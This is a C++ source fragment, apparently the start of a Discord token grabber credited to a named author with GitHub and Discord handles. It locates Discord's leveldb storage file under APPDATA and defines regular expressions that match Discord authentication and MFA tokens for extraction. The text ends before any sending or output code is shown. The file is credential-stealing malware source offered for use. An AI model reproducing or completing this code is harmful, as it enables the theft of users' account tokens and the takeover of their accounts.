#include <iostream>
#include <fstream>
#include <regex>

#include <stdlib.h>
#include <stdio.h>

using namespace std;
/*                                                         -|
 | Made by xanthe1337                                      -|
 | GitHub: https://github.com/xanthe1337                   -|
 | Discord: @xanthe#1337                                   -|
 | - - - - - - - - - - - - - - - - - - - - - - - - - - - - -|
 | Credits: Thanks iLinked1337 for the regexes <3 no homo  -|
*/
FILE* fp;
char* fpbuf;
int errThrower;
size_t sz = 0;
errno_t Environment = _dupenv_s(&fpbuf, &sz, "APPDATA");
string AppData = fpbuf;
string levelDB = AppData + "/Discord/Local Storage/leveldb/000005.ldb";
string Regex = R"([\w-]{24}\.[\w-]{6}\.[\w-]{27})";
string otherRegex = R"(mfa\.[\w-]{84})";
string String = "[oken";
string Content;
